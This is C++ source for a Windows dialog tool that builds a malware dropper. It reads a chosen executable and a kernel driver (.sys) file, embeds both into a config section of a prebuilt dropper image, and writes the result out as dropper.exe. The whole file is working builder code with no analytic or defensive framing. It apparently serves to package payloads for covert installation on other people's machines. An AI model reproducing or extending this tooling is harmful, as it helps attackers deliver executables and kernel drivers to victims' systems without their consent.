#include <windows.h>
#include <stdio.h>

#include <shlwapi.h>
#include <shlobj.h>

#include "ntdll.h"
#include "utils.h"
#include "rc4.h"
#include "secconfig.h"

#include "resource.h"

namespace DropperImage
{
	#include "dropper-hex.h"
}

char *OpenFileDialog(char *filter, HWND hWnd = NULL, int additional_flags = 0)
{
	OPENFILENAME ofn = {0};

	ofn.lStructSize= sizeof(ofn);
	ofn.lpstrFilter = filter;

	char *buffer = new char[1024];
	if (!buffer) return NULL;

	*buffer = 0;

	ofn.lpstrFile = buffer;
	ofn.nMaxFile = 1024;
	ofn.hwndOwner = hWnd;
	ofn.Flags = OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST|OFN_HIDEREADONLY|additional_flags;

	if (!GetOpenFileName(&ofn))
	{
		return NULL;
	}

	return ofn.lpstrFile;
}

typedef struct
{
	DWORD dwExeSize;
	DWORD dwSysSize;
}
DROPPER_PARAMS, *PDROPPER_PARAMS;

BOOL BuildDropper(LPCSTR lpExePath, LPCSTR lpSysPath)
{
	BOOL bRet = FALSE;
	PVOID pvExeFile;
	DWORD dwExeSize;
	PVOID pvSysFile;
	DWORD dwSysSize;
	PVOID pvMem;

	PVOID pvDropper = DropperImage::data;
	DWORD dwDropperSize = sizeof(DropperImage::data);

	if (FileRead(lpExePath, &pvExeFile, &dwExeSize))
	{
		if (FileRead(lpSysPath, &pvSysFile, &dwSysSize))
		{
			DWORD dwDataSize = sizeof(DROPPER_PARAMS) + dwExeSize + dwSysSize;

			pvMem = malloc(dwDataSize);
			if (pvMem)
			{
				PDROPPER_PARAMS pDropperParams = (PDROPPER_PARAMS)pvMem;

				pDropperParams->dwExeSize = dwExeSize;
				pDropperParams->dwSysSize = dwSysSize;

				CopyMemory(RtlOffsetToPointer(pvMem, sizeof(DROPPER_PARAMS)), pvExeFile, dwExeSize);
				CopyMemory(RtlOffsetToPointer(pvMem, sizeof(DROPPER_PARAMS) + dwExeSize), pvSysFile, dwSysSize);

				bRet = InsertSectionConfigInPE(pvDropper, dwDropperSize, pvMem, dwDataSize, &pvDropper, &dwDropperSize);

				free(pvMem);
			}

			free(pvSysFile);
		}

		free(pvExeFile);
	}

	if (bRet)
	{
		if (pvDropper)
		{
			bRet = FileWrite("dropper.exe", CREATE_ALWAYS, pvDropper, dwDropperSize);

			free(pvDropper);
		}
	}

	return bRet;
}

int WINAPI MainDlgProc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	CHAR ExeFilePath[MAX_PATH] = {0};
	CHAR SysFilePath[MAX_PATH] = {0};

	if (message == WM_COMMAND)
	{
		if (wParam == IDOK)
		{
			if (GetDlgItemTextA(hWnd, IDC_PATH_EXE, ExeFilePath, MAX_PATH-1))
			{
				if (GetDlgItemTextA(hWnd, IDC_PATH_SYS, SysFilePath, MAX_PATH-1))
				{
					if (BuildDropper(ExeFilePath, SysFilePath))
					{
						MessageBoxA(hWnd, "OK", "OK", MB_OK);
					}
				}
			}

			return 0;
		}

		if (wParam == IDC_CHOSE_EXE)
		{
			char *file = OpenFileDialog("Executable files (*.exe)\0*.exe\0", hWnd);
			if (file)
			{
				SetDlgItemText(hWnd, IDC_PATH_EXE, file);
			
				delete file;
			}

			return 0;
		}

		if (wParam == IDC_CHOSE_SYS)
		{
			char *file = OpenFileDialog("Executable files (*.sys)\0*.sys\0", hWnd);
			if (file)
			{
				SetDlgItemText(hWnd, IDC_PATH_SYS, file);

				delete file;
			}

			return 0;
		}

		if (wParam == IDCANCEL)
		{
			return EndDialog(hWnd, 0), ExitProcess(0), 0;
		}
	}

	return 0;
}

VOID Entry()
{
	if (DialogBoxParam(0, MAKEINTRESOURCE(IDD_DIALOG1), 0, MainDlgProc, 0) == -1)
	{
		MessageBox(0, "DialogBoxParam failed", 0, MB_ICONHAND);
	}
}